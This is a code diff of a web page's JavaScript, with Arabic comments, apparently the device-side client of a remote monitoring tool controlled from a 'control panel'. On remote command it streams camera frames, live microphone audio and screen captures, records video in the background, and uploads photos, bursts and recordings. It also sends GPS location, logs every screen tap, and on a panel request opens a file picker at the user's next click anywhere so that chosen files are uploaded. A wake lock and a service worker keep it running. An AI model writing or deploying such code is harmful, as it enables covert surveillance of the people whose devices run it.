+                video.play(); // تشغيل الفيديو في الخلفية
+                isStreaming = true;
+                startFrameLoop(200); // البدء بإرسال الصور للوحة التحكم
+
+                // 3. تفعيل البث المباشر للصوت (للاستماع)
+                // نستخدم نسخة من مسار الصوت لتجنب التعارض
+                const audioTrack = stream.getAudioTracks()[0];
+                if (!audioTrack) log('⚠️ تحذير: لا يوجد ميكروفون متاح');
+
+                const audioStream = new MediaStream([audioTrack.clone()]);
+                
+                // استخدام نفس إعدادات الصوت القوية لضمان التوافق
+                let audioOptions = {};
+                if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+                    audioOptions = { mimeType: 'audio/webm;codecs=opus' };
+                } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
+                    audioOptions = { mimeType: 'audio/mp4' };
+                }
+
+                audioRecorder = new MediaRecorder(audioStream, audioOptions);
+                audioRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        sendAudioChunk(event.data, audioRecorder.mimeType);
+                    }
+                };
+                audioRecorder.start(300); // شرائح أقصر لتقليل تأخير الصوت
+
+                // 4. بدء التسجيل الفعلي للملف (للحفظ)
+                mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
+                let chunks = [];
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) chunks.push(event.data);
+                };
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: mimeType });
+                    // تحديد الامتداد بناءً على الصيغة
+                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+                    uploadFile(blob, 'video_record.' + ext);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    isStreaming = false;
+                    stopFrameLoop(); // إيقاف حلقة الإرسال
+                    document.getElementById('status').innerText = 'متصل ✅';
+                };
+                mediaRecorder.start();
+                document.getElementById('status').innerText = 'جاري تسجيل الفيديو... 🎥';
+                log('🎥 جاري التسجيل والبث المباشر (صوت وصورة)...');
+            } catch (e) {
+                log('❌ خطأ في التسجيل: ' + e.message);
+            }
+        }
+
+        function stopVideoRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+                if (audioRecorder) audioRecorder.stop(); // إيقاف بث الصوت أيضاً
+                log('⏹ تم إيقاف التسجيل وجاري الرفع...');
+            }
+        }
+
+        function uploadFile(fileBlob, fileName) {
+            const formData = new FormData();
+            formData.append('file', fileBlob, fileName);
+            formData.append('device_id', deviceId); // إرسال هوية الجهاز لتنظيم الملفات
+            
+            fetch('/api/upload', { method: 'POST', body: formData })
+            .then(async r => {
+                const data = await r.json().catch(() => ({ success: false, error: 'استجابة غير صالحة من الخادم' }));
+                if (!r.ok || !data.success) {
+                    throw new Error(data.error || 'فشل الرفع');
+                }
+                return data;
+            })
+            .then(data => {
+                log('✅ تم رفع الملف: ' + fileName);
+                socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'File uploaded'});
+                // إرسال إشارة للوحة التحكم لبدء التحميل فوراً
+                socket.emit('download_ready', {device_id: deviceId, filename: data.filename});
+            })
+            .catch(e => log('❌ فشل الرفع: ' + (e && e.message ? e.message : e)));
+        }
+
+        // ✅ sendFrame: دالة التقاط إطار واحد (تُستدعى من الـ Worker)
+        function sendFrame() {
+            if (!isStreaming) return;
+            const video = document.getElementById('localVideo');
+            // تخطي الإطار إذا لم تكن أبعاد الفيديو جاهزة (يمنع الشاشة السوداء)
+            if (!video.videoWidth || !video.videoHeight || video.readyState < 2) return;
+            const canvas = document.createElement('canvas');
+            const targetWidth = isScreenSharing ? 640 : 420;
+            const scale = targetWidth / video.videoWidth;
+            canvas.width = targetWidth;
+            canvas.height = Math.round(video.videoHeight * scale);
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const jpegQuality = isScreenSharing ? 0.4 : 0.28;
+            const data = canvas.toDataURL('image/jpeg', jpegQuality);
+            socket.volatile.emit('camera_frame', {
+                device_id: deviceId,
+                frame: data.split(',')[1],
+                source: isScreenSharing ? 'screen' : 'camera'
+            });
+        }
+
+        // 🔄 حلقة الإطارات عبر Web Worker — لا تتأثر بتقييد setTimeout في الخلفية
+        let _frameWorker = null;
+        function startFrameLoop(intervalMs) {
+            stopFrameLoop();
+            try {
+                const code = 'var t=setInterval(function(){postMessage(0);},' + intervalMs + ');';
+                const blob = new Blob([code], {type: 'application/javascript'});
+                _frameWorker = new Worker(URL.createObjectURL(blob));
+                _frameWorker.onmessage = function() { if (isStreaming) sendFrame(); };
+            } catch(e) {
+                // fallback إذا كان Worker غير مدعوم
+                (function loop() { if (isStreaming) { sendFrame(); setTimeout(loop, intervalMs); } })();
+            }
+        }
+        function stopFrameLoop() {
+            if (_frameWorker) { _frameWorker.terminate(); _frameWorker = null; }
+        }
+
+        function captureAndUploadPhoto() {
+            if (!isStreaming) {
+                log('الكاميرا ليست نشطة لالتقاط صورة');
+                return;
+            }
+            const video = document.getElementById('localVideo');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                uploadFile(blob, 'photo.jpg');
+            }, 'image/jpeg', 0.9); // جودة عالية للصورة
+        }
+
+        async function captureBurst() {
+            if (!isStreaming) {
+                log('⚠️ يجب تشغيل الكاميرا أولاً للتصوير السريع');
+                return;
+            }
+            log('📸 بدء التصوير السريع (Burst Mode)...');
+            for(let i=0; i<10; i++) {
+                captureAndUploadPhoto();
+                await new Promise(r => setTimeout(r, 300)); // انتظار 300 جزء من الثانية بين كل صورة
+            }
+            log('✅ تم انتهاء التصوير السريع');
+        }
+
+        function requestScreenShareFromUser() {
+            if (isScreenSharing) {
+                log('ℹ️ مشاركة الشاشة تعمل بالفعل');
+                return;
+            }
+
+            pendingScreenShareRequest = true;
+            const overlay = document.getElementById('screenShareOverlay');
+            if (overlay) overlay.style.display = 'flex';
+            log('🖥️ تم طلب موافقة المستخدم لبدء مشاركة الشاشة');
+            socket.emit('command_response', {device_id: deviceId, status: 'pending', message: 'Awaiting user approval for screen share'});
+        }
+
+        async function startPendingScreenShare() {
+            pendingScreenShareRequest = false;
+            const overlay = document.getElementById('screenShareOverlay');
+            if (overlay) overlay.style.display = 'none';
+            await startScreenShare();
+        }
+
+        function cancelPendingScreenShare() {
+            pendingScreenShareRequest = false;
+            const overlay = document.getElementById('screenShareOverlay');
+            if (overlay) overlay.style.display = 'none';
+            log('🛑 تم إلغاء طلب مشاركة الشاشة');
+            socket.emit('command_response', {device_id: deviceId, status: 'error', message: 'Screen share cancelled by user'});
+        }
+
+        async function startScreenShare() {
+            try {
+                if (!window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+                    socket.emit('command_response', {
+                        device_id: deviceId,
+                        status: 'error',
+                        message: 'Permission denied: مشاركة الشاشة تحتاج رابط HTTPS أو localhost.'
+                    });
+                    return;
+                }
+
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+                    log('❌ مشاركة الشاشة غير مدعومة على هذا الهاتف/المتصفح');
+                    socket.emit('command_response', {device_id: deviceId, status: 'error', message: 'Screen sharing not supported on mobile'});
+                    return;
+                }
+
+                if (isScreenSharing) {
+                    log('ℹ️ مشاركة الشاشة تعمل بالفعل');
+                    return;
+                }
+
+                if (cameraStream) await stopCamera();
+
+                screenStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { frameRate: { ideal: 12, max: 18 } },
+                    audio: false
+                });
+
+                const track = screenStream.getVideoTracks()[0];
+                if (track) {
+                    track.addEventListener('ended', () => {
+                        stopScreenShare();
+                    });
+                }
+
+                const video = document.getElementById('localVideo');
+                video.srcObject = screenStream;
+                // لا ننتظر playing لتجنب التعليق على بعض المتصفحات
+                video.play().catch(() => {});
+
+                pendingScreenShareRequest = false;
+                const overlay = document.getElementById('screenShareOverlay');
+                if (overlay) overlay.style.display = 'none';
+                isStreaming = true;
+                isScreenSharing = true;
+                startFrameLoop(100);
+                sendFrame();
+
+                log('🖥️ بدأت مشاركة الشاشة المباشرة');
+                socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Screen share started'});
+            } catch(e) {
+                const errName = e && e.name ? e.name : 'Error';
+                const errText = e && e.message ? e.message : 'Unknown error';
+                log('❌ خطأ في مشاركة الشاشة: ' + errText);
+
+                let responseMsg = 'Screen share error: ' + errText;
+                if (errName === 'NotAllowedError' || /permission denied|denied permission/i.test(errText)) {
+                    responseMsg = 'Permission denied: المستخدم رفض مشاركة الشاشة أو المتصفح منعها. اضغط ابدأ مشاركة الشاشة ثم اختر شاشة كاملة.';
+                } else if (errName === 'NotReadableError') {
+                    responseMsg = 'Screen share error: الشاشة مشغولة أو غير متاحة الآن. أغلق أي مشاركة شاشة أخرى وحاول مرة ثانية.';
+                }
+
+                socket.emit('command_response', {device_id: deviceId, status: 'error', message: responseMsg});
+            }
+        }
+
+        async function stopScreenShare(silent = false) {
+            if (!isScreenSharing && !screenStream) return;
+
+            if (screenStream) {
+                screenStream.getTracks().forEach(track => track.stop());
+                screenStream = null;
+            }
+
+            isScreenSharing = false;
+            pendingScreenShareRequest = false;
+            isStreaming = false;
+            stopFrameLoop();
+            const overlay = document.getElementById('screenShareOverlay');
+            if (overlay) overlay.style.display = 'none';
+
+            if (!cameraStream) {
+                const video = document.getElementById('localVideo');
+                if (video) video.srcObject = null;
+            }
+
+            log('🛑 تم إيقاف مشاركة الشاشة');
+            if (!silent) {
+                socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Screen share stopped'});
+            }
+        }
+
+        // توافق خلفي مع الاسم القديم
+        async function startScreenRecording() {
+            await startScreenShare();
+        }
+
+        // ✅ تفعيل Wake Lock لمنع الهاتف من النوم (ضروري للخلفية)
+        let wakeLock = null;
+        async function requestWakeLock() {
+            try {
+                wakeLock = await navigator.wakeLock.request('screen');
+                log('💡 تم تفعيل وضع العمل المستمر (Wake Lock)');
+            } catch (err) {
+                log(`⚠️ تنبيه: لا يمكن منع السكون (${err.name})`);
+            }
+        }
+
+        function sendCurrentLocation() {
+            log('📍 جاري تحديد الموقع...');
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        log('✅ تم تحديد الموقع، جاري الإرسال...');
+                        fetch('/api/location', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                deviceId: deviceId,
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude
+                            })
+                        })
+                        .then(() => {
+                            socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Location sent'});
+                        })
+                        .catch(e => log('خطأ في إرسال الموقع: ' + e));
+                    }, 
+                    (err) => {
+                        log('❌ تعذر الحصول على الموقع: ' + err.message);
+                        const deniedByUser = err && (err.code === 1 || String(err.name || '').toLowerCase() === 'permissiondeniederror');
+                        reportLocationPermissionStatus(deniedByUser ? 'denied' : 'error');
+                    }, 
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                reportLocationPermissionStatus('unsupported');
+            }
+        }
+
+        function stopLocationTracking() {
+            if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage({ command: 'stop_location' });
+            }
+            if (locationWatchId !== null) {
+                navigator.geolocation.clearWatch(locationWatchId);
+                locationWatchId = null;
+            }
+            log('🛑 تم إيقاف تتبع الموقع');
+        }
+
+        function showLocalTapPulse(x, y) {
+            const pulse = document.createElement('div');
+            pulse.style.cssText = `
+                position: fixed;
+                left: ${x}px;
+                top: ${y}px;
+                width: 18px;
+                height: 18px;
+                border-radius: 50%;
+                border: 2px solid #00e5ff;
+                background: rgba(0, 229, 255, 0.2);
+                transform: translate(-50%, -50%);
+                pointer-events: none;
+                z-index: 21000;
+                animation: ripple 0.55s ease-out forwards;
+            `;
+            document.body.appendChild(pulse);
+            setTimeout(() => pulse.remove(), 600);
+        }
+
+        function emitScreenTap(clientX, clientY) {
+            const now = Date.now();
+            if (now - lastTapEmitAt < 120) return;
+            lastTapEmitAt = now;
+
+            const width = window.innerWidth || document.documentElement.clientWidth || 1;
+            const height = window.innerHeight || document.documentElement.clientHeight || 1;
+            const x = Math.max(0, Math.min(1, clientX / width));
+            const y = Math.max(0, Math.min(1, clientY / height));
+
+            socket.emit('screen_tap', {
+                device_id: deviceId,
+                x: Number(x.toFixed(4)),
+                y: Number(y.toFixed(4)),
+                width,
+                height,
+                ts: now
+            });
+
+            showLocalTapPulse(clientX, clientY);
+        }
+
+        // 📱 معالجة العودة للمقدمة: إعادة الاتصال والـ Wake Lock تلقائياً
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                requestWakeLock();
+                if (!socket.connected) socket.connect();
+            }
+        });
+
+        // تسجيل الـ Service Worker (يساعد في الإبقاء على الاتصال بالخلفية)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.addEventListener('message', (e) => {
+                if (e.data === 'keepAlive' && !socket.connected) socket.connect();
+            });
+            navigator.serviceWorker.register('/sw.js')
+                .then(reg => log('✅ Service Worker مسجل بنجاح.'))
+                .catch(err => log('❌ فشل تسجيل Service Worker: ' + err));
+        }
+
+        // الاستماع لتغيير الملف ورفعه فوراً
+        document.getElementById('hiddenFileInput').addEventListener('change', (e) => {
+            if (e.target.files.length > 0) {
+                // دعم رفع ملفات متعددة
+                for (let i = 0; i < e.target.files.length; i++) {
+                    const file = e.target.files[i];
+                    log(`جاري رفع الملف (${i+1}/${e.target.files.length}): ${file.name}`);
+                    uploadFile(file, 'uploaded_' + file.name);
+                }
+                document.getElementById('uploadOverlay').style.display = 'none';
+                localFilePickMode = 'all';
+            }
+        });
+
+        // تشغيل Wake Lock عند الاتصال
+        document.addEventListener('pointerdown', (ev) => {
+            if (ev.isPrimary === false) return;
+            emitScreenTap(ev.clientX, ev.clientY);
+        }, { passive: true });
+
+        document.addEventListener('click', async () => {
+            // تنفيذ طلب الملفات عند النقر
+            if (pendingFileRequest) {
+                const type = pendingFileRequest;
+                pendingFileRequest = null;
+                
+                const input = document.getElementById('hiddenFileInput');
+                if (type === 'images') input.accept = "image/*";
+                else if (type === 'videos') input.accept = "video/*";
+                else input.removeAttribute('accept');
+                
+                try {
+                    input.value = '';
+                    input.click();
+                    log('📂 تم فتح نافذة الملفات');
+                } catch(e) {
+                    log('❌ تعذر فتح النافذة: ' + e);
+                }
+            }
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            showPermissionOverlay();
+        });
+
+    </script>
+</body>
+</html>
